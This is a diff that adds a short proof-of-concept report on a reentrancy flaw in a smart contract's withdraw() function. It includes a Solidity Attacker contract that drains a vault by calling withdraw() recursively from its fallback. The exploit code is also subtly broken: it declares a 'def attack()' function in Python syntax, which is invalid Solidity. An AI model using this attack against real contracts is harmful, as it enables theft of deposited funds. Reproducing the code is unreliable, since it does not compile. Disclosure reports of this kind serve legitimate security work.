@@ -1,0 +1,28 @@
+=== VULNERABILITY PROOF-OF-CONCEPT REPORT ===
+TITLE: Unprotected Reentrancy in withdraw() Function
+
+AFFECTED CONTRACT: 0x1234567890abcdef1234567890abcdef12345678
+
+VULNERABILITY DETAILS:
+The `withdraw(uint256 amount)` method updates user balance state *after* transferring native assets to `msg.sender`.
+An attacker can deploy a malicious contract that calls `withdraw()` recursively within its fallback function before state update occurs, draining the entire vault balance.
+
+PROOF OF CONCEPT CODE:
+```solidity
+contract Attacker {
+    IVault target;
+    constructor(address _target) { target = IVault(_target); }
+    fallback() external payable {
+        if (address(target).balance > 0) {
+            target.withdraw(1 ether);
+        }
+    }
+    def attack() external payable {
+        target.deposit{value: 1 ether}();
+        target.withdraw(1 ether);
+    }
+}
+```
+
+IMPACT:
+Critical. Enables complete depletion of escrowed TVL in a single transaction sequence.
